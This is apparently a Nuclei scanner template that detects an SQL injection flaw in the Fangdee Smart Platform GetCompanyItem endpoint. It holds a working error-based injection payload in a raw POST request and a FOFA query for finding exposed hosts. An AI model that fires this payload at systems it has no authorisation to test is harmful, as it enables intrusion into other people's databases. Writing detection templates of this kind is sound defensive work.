http:
- matchers:
  - condition: and
    dsl:
    - status_code == 500
    - contains(body, 'SmartSoft.Web.AjaxMethods.GetCompanyItem')
    type: dsl
  raw:
  - 'POST /AjaxMethods.asmx/GetCompanyItem HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    X-Requested-With: XMLHttpRequest


    {"cusNumber":"1'' and 2=user--+"}

    '
id: fangdee-getcompanyitem-sqli
info:
  author: Co5mos
  description: 'Fangdee Smart Platform system''s `GetCompanyItem` endpoint has an
    SQL injection vulnerability that allows attackers to execute arbitrary SQL commands.

    '
  metadata:
    fofa-query: body="AjaxMethods.asmx/GetCompanyItem"
  name: Fangdee Smart Platform GetCompanyItem SQL Injection
  severity: critical
  tags: fangdee, sqli
